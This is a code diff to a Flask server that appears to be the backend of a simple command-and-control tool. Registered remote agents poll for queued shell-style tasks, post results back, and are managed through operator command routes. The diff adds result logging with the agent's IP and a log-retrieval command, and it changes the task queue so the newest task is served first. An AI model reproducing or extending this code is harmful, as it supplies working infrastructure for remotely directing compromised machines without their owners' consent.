@@ -23,9 +23,19 @@ class Agent:
         self.ip = ip
         self.host = host
         self.tasks = []
+        self.log = []
         agent_list.append(self)
     def createID(self):
         return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+    def getLog(self):
+        if self.log == []:
+            return "Agent log is empty."
+        else:
+            log = ""
+            while self.log != []:
+                log += self.log.pop(0) + "\n\n"
+            return log
+
 
 @app.route('/reg', methods=['POST'])
 def createAgent():
@@ -40,7 +50,7 @@ def sendTasks(id):
     agent = getAgentByID(id)
     if agent != None:
         if agent.tasks != []:
-            task = agent.tasks.pop(0)
+            task = agent.tasks.pop()
             return (task, 200)
         else:
             return ('', 204)
@@ -49,15 +59,20 @@ def sendTasks(id):
 def getResults(id):
     global agent_list
     result = request.form.get("result").split()
+    ip = request.remote_addr
     if result != []:
         if result == ['exit']:
             agent = getAgentByID(id)
             if agent != None:
                 agent_list.remove(agent)
-        if result[0] == 'id':
+        elif result[0] == 'id':
             agent = getAgentByID(id)
             if agent != None:
                 agent.id = result[1]
+        else:
+            agent = getAgentByID(id)
+            agent.log.append(" ".join(result))
+            printToLog(ip, agent.log)
     return ('', 204)
 
 @app.route('/commands/<cmd>', methods=['GET', 'POST'])
@@ -76,6 +91,13 @@ def parseCommand(cmd):
         command = request.form.get('command')
         if agent != None:
             agent.tasks.append(command)
+        else:
+            return ('Agent not found.', 200)
+    elif cmd == 'log':
+        agent = getAgentByID(request.form.get('agent'))
+        if agent != None:
+            log = agent.getLog()
+            return (log, 200)
         else:
             return ('Agent not found.', 200)
     return ('', 204)
